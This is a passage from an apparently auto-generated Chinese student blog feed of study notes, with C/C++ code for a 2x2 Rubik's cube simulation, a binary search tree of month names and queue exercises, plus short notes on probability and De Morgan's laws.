class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//上-&gt;前</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;上</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];  <span class="hljs-comment">//!!!</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]; <span class="hljs-comment">//!!!</span><br><br>data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//data1[0][1]</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//data1[1][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">adjust</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data)[maxn],<span class="hljs-type">int</span> op)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> tmp = data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br><span class="hljs-keyword">if</span>(op == <span class="hljs-number">1</span>)&#123;<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = tmp;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>  </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,op);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-built_in">strlen</span>(op);++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;F&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(font,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转正面</span><br><span class="hljs-built_in">getswapF</span>(top,rightt,down,leftt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;f&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(font,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转正面</span><br><span class="hljs-built_in">getswapf</span>(top,rightt,down,leftt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;u&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(top,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转顶面</span><br><span class="hljs-built_in">getswapU</span>(rightt,font,leftt,back);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;U&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(top,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转顶面</span><br><span class="hljs-built_in">getswapU</span>(back,leftt,font,rightt);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;R&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(rightt,<span class="hljs-number">1</span>);<span class="hljs-comment">//顺时针旋转右面</span><br><span class="hljs-built_in">getswapR</span>(font,top,back,down);<br>&#125;<br><span class="hljs-keyword">if</span>(op[i] == <span class="hljs-string">&#x27;r&#x27;</span>)<br>&#123;<br><span class="hljs-built_in">adjust</span>(rightt,<span class="hljs-number">0</span>);<span class="hljs-comment">//逆时针旋转右面</span><br><span class="hljs-built_in">getswapr</span>(font,top,back,down);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printans</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>队列      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-built_in">map</span>&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; mp;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> n,x;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>mp[x]++;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">-10000</span>;i&lt;=<span class="hljs-number">10000</span>;i++)&#123;<br><span class="hljs-keyword">while</span>(mp[i]&gt;<span class="hljs-number">0</span>)&#123;<br>mp[i]--;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,i);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-21475da1" role="button" aria-expanded="false" aria-controls="collapse-21475da1">        <div class="fold-arrow">▶</div>小结      </div>      <div class="fold-collapse collapse" id="collapse-21475da1">        <div class="fold-content">          <p><strong>是对C语言的复习，同时也为后边做了铺垫。</strong></p><p><strong>数组合并：这种有序合并方式是（第十章）归并排序的核心操作之一。</strong><br><strong>二阶魔方：模拟题，模拟方式是数组元素的交换，考验耐心。</strong><br><strong>队列：典型桶排序（第十章）。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-树(中)</title>
    <link href="/dong.github/2024/09/10/Datastructures-%E6%A0%91-%E4%B8%AD/"/>
    <url>/dong.github/2024/09/10/Datastructures-%E6%A0%91-%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><h1 id="引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树"><a href="#引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树" class="headerlink" title="引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树"></a>引例：实现一个按字典序的存着12个月的英文单词的二叉搜索树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">char</span>* months[<span class="hljs-number">12</span>] = &#123;  <br><span class="hljs-string">&quot;January&quot;</span>, <span class="hljs-string">&quot;February&quot;</span>, <span class="hljs-string">&quot;March&quot;</span>, <span class="hljs-string">&quot;April&quot;</span>,    <br><span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;June&quot;</span>, <span class="hljs-string">&quot;July&quot;</span>, <span class="hljs-string">&quot;August&quot;</span>,    <br><span class="hljs-string">&quot;September&quot;</span>, <span class="hljs-string">&quot;October&quot;</span>, <span class="hljs-string">&quot;November&quot;</span>, <span class="hljs-string">&quot;December&quot;</span>    <br>&#125;;  <br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dd624aea" role="button" aria-expanded="false" aria-controls="collapse-dd624aea">        <div class="fold-arrow">▶</div>解答      </div>      <div class="fold-collapse collapse" id="collapse-dd624aea">        <div class="fold-content">          <p><strong>综合了前边所有的前置知识，还用到了C语言相关基础。</strong><br><strong>避坑！：第一个指针T必须事先赋值为NULL，不然会出现一个segmentation fault-段错误，指到了不该指的地方。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><br><span class="hljs-comment">// 定义二叉树节点结构体  </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span>  <br><span class="hljs-type">char</span> *s;  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">Left</span>;</span>  <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">Right</span>;</span>  <br>&#125; BinTree;  <br><br><span class="hljs-comment">// 插入函数  </span><br>BinTree* <span class="hljs-title function_">TreeInsert</span><span class="hljs-params">(<span class="hljs-type">char</span> *s, BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) &#123;  <br>T = (BinTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BinTree));  <br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) &#123;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory allocation failed\n&quot;</span>);  <br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);  <br>&#125;  <br>T-&gt;s = strdup(s);  <span class="hljs-comment">// 复制字符串  </span><br>T-&gt;Left = T-&gt;Right = <span class="hljs-literal">NULL</span>;  <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(s, T-&gt;s) &lt; <span class="hljs-number">0</span>) &#123;  <br>T-&gt;Left = TreeInsert(s, T-&gt;Left);  <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(s, T-&gt;s) &gt; <span class="hljs-number">0</span>) &#123;  <br>T-&gt;Right = TreeInsert(s, T-&gt;Right);  <br>&#125;  <br><span class="hljs-comment">// 不处理重复项（如果s等于T-&gt;s，则不插入）  </span><br><span class="hljs-keyword">return</span> T;  <br>&#125;  <br><br><span class="hljs-comment">// 中序遍历函数  </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraversal</span><span class="hljs-params">(BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;  <br>InOrderTraversal(T-&gt;Left);  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, T-&gt;s);  <br>InOrderTraversal(T-&gt;Right);  <br>&#125;  <br>&#125;  <br><br><span class="hljs-comment">// 释放二叉树内存的函数  </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">FreeTree</span><span class="hljs-params">(BinTree *T)</span> &#123;  <br><span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;  <br>FreeTree(T-&gt;Left);  <br>FreeTree(T-&gt;Right);  <br><span class="hljs-built_in">free</span>(T-&gt;s);  <span class="hljs-comment">// 释放字符串内存  </span><br><span class="hljs-built_in">free</span>(T);     <span class="hljs-comment">// 释放节点内存  </span><br>&#125;  <br>&#125;  <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;  <br><span class="hljs-type">char</span>* months[<span class="hljs-number">12</span>] = &#123;  <br><span class="hljs-string">&quot;January&quot;</span>, <span class="hljs-string">&quot;February&quot;</span>, <span class="hljs-string">&quot;March&quot;</span>, <span class="hljs-string">&quot;April&quot;</span>,    <br><span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;June&quot;</span>, <span class="hljs-string">&quot;July&quot;</span>, <span class="hljs-string">&quot;August&quot;</span>,    <br><span class="hljs-string">&quot;September&quot;</span>, <span class="hljs-string">&quot;October&quot;</span>, <span class="hljs-string">&quot;November&quot;</span>, <span class="hljs-string">&quot;December&quot;</span>    <br>&#125;;  <br>BinTree *T = <span class="hljs-literal">NULL</span>;  <br><br><span class="hljs-comment">// 插入月份到BST  </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;  <br>T = TreeInsert(months[i], T);  <br>&#125;  <br><br><span class="hljs-comment">// 中序遍历BST并打印结果  </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inorder traversal of BST:\n&quot;</span>);  <br>InOrderTraversal(T);  <br><br><span class="hljs-comment">// 释放二叉树内存  </span><br>FreeTree(T);  <br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可以试试把递归和非递归的各种遍历都试试。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>概率统计0</title>
    <link href="/dong.github/2024/09/10/statistics0/"/>
    <url>/dong.github/2024/09/10/statistics0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“必须明确“等可能性”是相对实验点而言的。”</strong></p><span id="more"></span><p><strong>本文企图通过山羊与汽车问题、贝特朗悖论等例子，说明“必须明确“等可能性”是相对实验点而言的。”，进而阐明一般概率和条件概率的关系，作为第一章到第二章的衔接过渡。</strong></p><h1 id="山羊与汽车问题"><a href="#山羊与汽车问题" class="headerlink" title="山羊与汽车问题"></a>山羊与汽车问题</h1><p><strong>第一节课一上课就提出了这个问题，怎么解？</strong><br><img src="/dong.github/images/0910-3.png"><br>补充一下：主持人是在知道每扇门背后有什么的情况下打开的。</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6105cd3c" role="button" aria-expanded="false" aria-controls="collapse-6105cd3c">        <div class="fold-arrow">▶</div>嗯？思考一下？      </div>      <div class="fold-collapse collapse" id="collapse-6105cd3c">        <div class="fold-content">          <p><img src="/dong.github/images/0910-4.png"></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数学基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>概率统计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数理逻辑-集合与逻辑-逻辑代数</title>
    <link href="/dong.github/2024/09/10/math0/"/>
    <url>/dong.github/2024/09/10/math0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>几乎是同时地，概率统计、数字电路基础、离散数学三门核心课同时涉及到了非常类似的内容。所以这篇blog作为总序，希望可以阐明这其中的区别与联系，为三门课程的后续打下个好基础。另外就是在这里集中整理一下De Morgan律的证明与应用（因为到处在用）。</strong></p><span id="more"></span><p><strong>开宗明义：为什么有那么多这么相似的符号，什么时候成了逻辑语句，什么时候又成了集合？</strong><br><img src="/dong.github/images/0910.png"><br><strong>简言之，数电和离散数学（第一二章）在用逻辑解决问题，而概统和离散数学（第三章）在用集合解决问题。而集合与逻辑的关系如上图。</strong><br><strong>“一阶逻辑的语法、语义概念都可以在集合论中定义， 关于一阶逻辑的定理可以被看作是集合论的定理”。</strong></p><h1 id="概率统计："><a href="#概率统计：" class="headerlink" title="概率统计："></a>概率统计：</h1><p><strong>事件为集合，事件间的关系和运算按照集合间的关系和运算来处理。由“事件发生”的含义，当赋予集合间的关系和运算以概率含义时，就得到事件间的关系和运算.</strong></p><h1 id="电子技术基础（数字部分）："><a href="#电子技术基础（数字部分）：" class="headerlink" title="电子技术基础（数字部分）："></a>电子技术基础（数字部分）：</h1><p><strong>逻辑代数有一定的定理、定理和规则，用它们对数学表达式进行处理，可以完成对逻辑电路的化简、变换、分析和设计。</strong><br><strong>利用逻辑代数这种数学工具，可以把逻辑电路输入和输出之间的关系用代数方程表示出来。</strong></p><h1 id="离散数学："><a href="#离散数学：" class="headerlink" title="离散数学："></a>离散数学：</h1><p><strong>命题逻辑：命题是逻辑学研究的出发点。</strong><br><strong>一阶谓词逻辑：命题逻辑的不足，在于它不能有效区分主体客体。</strong><br><strong>集合与关系：集合是数学中最为基本的概念，又是数学各分支等各领域最普遍的描述工具。</strong></p><h1 id="De-Morgan定律"><a href="#De-Morgan定律" class="headerlink" title="De Morgan定律"></a>De Morgan定律</h1><p><strong>同一个东西，离散数学里叫De Morgan律，数电中叫反演规则，概统叫对偶律。应用很多，可以说是三门共同的考点。</strong><br><img src="/dong.github/images/0910-1.png"><br><img src="/dong.github/images/0910-2.png"><br><strong>直接用数学语言证明不太容易，以上两种办法即可。但是更重要的还是其应用。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数学基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-队列</title>
    <link href="/dong.github/2024/09/08/Datastructures-%E9%98%9F%E5%88%97/"/>
    <url>/dong.github/2024/09/08/Datastructures-%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>先进先出的数据结构，很常用</strong></p><span id="more"></span>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>STL queue      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>queue&lt;<span class="hljs-type">int</span>&gt; Q;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队5\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队4\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;入队3\n&quot;</span>); <br>Q.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队%d\n&quot;</span>,Q.<span class="hljs-built_in">front</span>());<br>Q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0908-2.png"></div><div class="group-image-wrap"><img src="/dong.github/images/0908-3.png"></div></div></div><p><strong>举个栗子：</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-e3c90cfe" role="button" aria-expanded="false" aria-controls="collapse-e3c90cfe">        <div class="fold-arrow">▶</div>洛谷P1540      </div>      <div class="fold-collapse collapse" id="collapse-e3c90cfe">        <div class="fold-content">          <p><a href="https://www.luogu.com.cn/problem/P1540">https://www.luogu.com.cn/problem/P1540</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> m,n;<br><span class="hljs-type">int</span> countt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> que[<span class="hljs-number">10000</span>];<br><span class="hljs-type">int</span> head;<br><span class="hljs-type">int</span> tail;<br>map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;mapp;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; m &gt;&gt; n;<br>head = tail = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-type">int</span> c;cin &gt;&gt; c ;<br><span class="hljs-keyword">if</span>(mapp.<span class="hljs-built_in">count</span>(c))<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(tail - head + <span class="hljs-number">1</span> &lt;= m)<br>&#123;<br>countt ++ ;<br>que[tail] = c;<br>tail ++ ;<br>mapp[c] = <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>countt ++ ;<br>que[tail] = c;<br>tail ++ ;<br>mapp[c] = <span class="hljs-number">1</span>;<br>mapp.<span class="hljs-built_in">erase</span>(que[head]);<br>head ++ ;<br>&#125;<br>&#125;<br>cout &lt;&lt; countt &lt;&lt; endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//数组模拟队列+map实现哈希表</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>循环队列的顺序存储实现      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 100</span><br><span 